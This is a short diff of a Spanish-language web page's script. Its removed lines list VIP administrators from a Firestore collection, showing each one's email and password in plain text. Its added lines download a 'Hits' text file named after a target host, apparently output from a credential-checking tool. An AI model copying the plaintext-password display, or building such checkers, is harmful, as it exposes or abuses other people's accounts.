-                        <span class="member-meta">Correo: ${data.email} | Clave: ${data.pass}</span>
-                        <button class="btn-mini" style="background:var(--red-sub); margin-top:5px; width:fit-content; align-self:flex-end;" onclick="removerAdmin('${id}')">Revocar</button>
-                    `;
-                    list.appendChild(item);
-                });
-            });
-        }
-
-        window.removerAdmin = async (id) => {
-            if (confirm("¿Eliminar administrador?")) await deleteDoc(doc(db, "usuarios_vip", id));
-        };
-
-        document.getElementById('btnSalir').onclick = () => {
-            localStorage.removeItem('andy_sys_session'); window.location.reload();
-        };
+            a.download = `Hits_AndyPro_${limpiarHost(hostInput.value)}.txt`;
+            document.body.appendChild(a); a.click(); a.remove();
+        });
     </script>
 </body>
 </html>
